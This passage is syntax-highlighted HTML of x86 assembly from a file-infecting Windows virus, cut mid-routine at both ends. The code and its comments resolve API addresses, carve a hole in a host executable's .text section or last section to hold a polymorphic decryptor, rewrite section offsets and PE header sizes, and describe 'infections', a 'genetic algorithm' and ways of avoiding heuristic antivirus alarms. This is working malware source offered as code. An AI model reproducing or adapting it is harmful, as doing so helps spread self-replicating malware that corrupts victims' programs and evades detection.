                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetProcAddressAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetModuleHandleAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetModuleHandleAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VirtualAllocAddress</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; If we haven't</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">; VirtualAlloc, we don't</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NoVirtualAlloc</span><span class="sc0">                 </span><span class="sc1">; exit with error, but</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; then we have to</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VirtualAllocAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; retrieve it in</span><span class="sc0">
     </span><span class="sc5">@@NoVirtualAlloc</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">; runtime in the decryptor.</span><span class="sc0">

</span><span class="sc1">;; Pseudo-code of the algorithm we use to get a virtual hole in .text where</span><span class="sc0">
</span><span class="sc1">;; we can put the decryptor:</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; If(PhysicalSize &gt; VirtualSize)</span><span class="sc0">
</span><span class="sc1">;;      Phys_TextHoleAddr = VirtualSize;</span><span class="sc0">
</span><span class="sc1">;;      Virt_TextHoleAddr = VirtualSize;</span><span class="sc0">
</span><span class="sc1">;;      TextHoleSize = PhysicalSize - VirtualSize;</span><span class="sc0">
</span><span class="sc1">;;      If((TextHoleSize + VirtualSize) &gt; NextVirtualAddress)</span><span class="sc0">
</span><span class="sc1">;;         Exit;</span><span class="sc0">
</span><span class="sc1">;;      VirtualSize += TextHoleSize;</span><span class="sc0">
</span><span class="sc1">;;      /* The hole is already made physically */</span><span class="sc0">
</span><span class="sc1">;; If(PhysicalSize &lt;= VirtualSize)</span><span class="sc0">
</span><span class="sc1">;;    Phys_TextHoleAddr = PhysicalSize;</span><span class="sc0">
</span><span class="sc1">;;    Virt_TextHoleAddr = PhysicalSize;</span><span class="sc0">
</span><span class="sc1">;;    TextHoleSize = VirtualSize - PhysicalSize;</span><span class="sc0">
</span><span class="sc1">;;    If(TextHoleSize &lt; MIN_SIZE)</span><span class="sc0">
</span><span class="sc1">;;         Exit;</span><span class="sc0">
</span><span class="sc1">;;    If(TextHoleSize &gt; MAX_SIZE)</span><span class="sc0">
</span><span class="sc1">;;         TextHoleSize = MAX_SIZE;</span><span class="sc0">
</span><span class="sc1">;;    PhysicalSize += TextHoleSize;</span><span class="sc0">
</span><span class="sc1">;;    Add TextHoleSize to physical offset of all headers (from .text)</span><span class="sc0">
</span><span class="sc1">;;    Make a hole of size TextHoleSize at Phys_TextHoleAddr</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean_X004_7</span><span class="sc0">  </span><span class="sc1">; Don't rely on fixed methods.</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">    </span><span class="sc1">; Using this method, one on every X</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; infections will be forced to use the</span><span class="sc0">
                                    </span><span class="sc1">; "no virtual hole" (and if it's not</span><span class="sc0">
                                    </span><span class="sc1">; good, the genetic algorithm will make</span><span class="sc0">
                                    </span><span class="sc1">; the adjust by "evolution").</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@HoleAtLastSection</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TextHeader</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the physical size</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Check against the virtual size</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@CheckPaddingSpace</span><span class="sc0"> </span><span class="sc1">; If Phys_Size &gt; Virt_Size, jump</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the physical offset where the</span><span class="sc0">
                                          </span><span class="sc1">; section ends</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Phys_TextHole</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Set the physical address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Get the physical address</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Add the virtual size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_TextHole</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Size the virtual address of</span><span class="sc0">
                                                 </span><span class="sc1">; the hole.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Get the virtual size</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Subtract the physical size</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">          </span><span class="sc1">; If the hole has a size of at least</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@HoleAtLastSection</span><span class="sc0">  </span><span class="sc1">; 512 bytes,</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">     </span><span class="sc1">; If it's signed (phys_size &gt; virt)</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">              </span><span class="sc1">; then exit with error</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">         </span><span class="sc1">; If the size is greater than 4096</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@TextHoleSizeOK</span><span class="sc0">     </span><span class="sc1">; bytes, limit it to 4096.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">
      </span><span class="sc5">@@TextHoleSizeOK</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MaxSizeOfDecryptor</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Set the max size.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LastHeader</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get the last header in ECX</span><span class="sc0">
      </span><span class="sc5">@@LoopAddPhysicalSize</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">               </span><span class="sc1">; Add the physical size to the</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NextAddPhysicalSize</span><span class="sc0">    </span><span class="sc1">; physical offset of every</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; section to update it and make</span><span class="sc0">
      </span><span class="sc5">@@NextAddPhysicalSize</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">; the physical hole effective.</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@EndAddPhysicalSize</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@LoopAddPhysicalSize</span><span class="sc0">

      </span><span class="sc5">@@EndAddPhysicalSize</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">; Now we make the hole physically.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileSize</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc5">@@LoopMakePhysicalHole</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">; Make the hole</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopMakePhysicalHole</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@TextHoleMade</span><span class="sc0">

</span><span class="sc1">;; This method of infection uses the last section to put both decryptor and</span><span class="sc0">
</span><span class="sc1">;; virus data. It's the method that makes more heuristical alarms, but well,</span><span class="sc0">
</span><span class="sc1">;; it's a standard one. Since we don't touch the section flags (in fact, if</span><span class="sc0">
</span><span class="sc1">;; the section flags have a WRITABLE flag we exit) we avoid that alarm.</span><span class="sc0">
      </span><span class="sc5">@@HoleAtLastSection</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LastHeader</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Set the virtual code hole at the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_TextHole</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; virtual end of the last sec.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Physically, the same (but at the</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; physical end)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Phys_TextHole</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">          </span><span class="sc1">; Set the maximum size of the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MaxSizeOfDecryptor</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; decryptor to 4096</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;                or      eax, 20000020h ; If section is readable, is also</span><span class="sc0">
                               </span><span class="sc1">; executable, since the exec flag is only</span><span class="sc0">
                               </span><span class="sc1">; checked at startup (and we don't jump here</span><span class="sc0">
                               </span><span class="sc1">; directly, since we use EPO).</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FDFFFFFFh</span><span class="sc0"> </span><span class="sc1">; Eliminate the "DISCARDABLE" flag</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@GetDataHole</span><span class="sc0">


      </span><span class="sc5">@@CheckPaddingSpace</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; Set the physical and virtual code</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; hole address. After that, check</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; if we have enough padding space to</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_TextHole</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; make the decryptor there.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Phys_TextHole</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Set the alignment padding size as the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MaxSizeOfDecryptor</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; maximum size of the</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">              </span><span class="sc1">; decryptor. If it's below 512,</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@HoleAtLastSection</span><span class="sc0">      </span><span class="sc1">; make a last-section infection.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; If the virtual address + physical</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; size of the section overpasses the</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">              </span><span class="sc1">; virtual size of the next section</span><span class="sc0">
                                           </span><span class="sc1">; (overlapping it), exit with error.</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">; Add the virtual size of the hole.</span><span class="sc0">

</span><span class="sc1">;; Fill hole with 0s</span><span class="sc0">
      </span><span class="sc5">@@TextHoleMade</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MaxSizeOfDecryptor</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Phys_TextHole</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFFFCh</span><span class="sc0">
      </span><span class="sc5">@@LoopFillHole</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Overwrite the data of the hole with 0s.</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopFillHole</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Set the new virtual size of the code</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HeaderAddress</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; section as the virtual code</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; size in the PE header.</span><span class="sc0">

      </span><span class="sc5">@@GetDataHole</span><span class="sc4">:</span><span class="sc0">
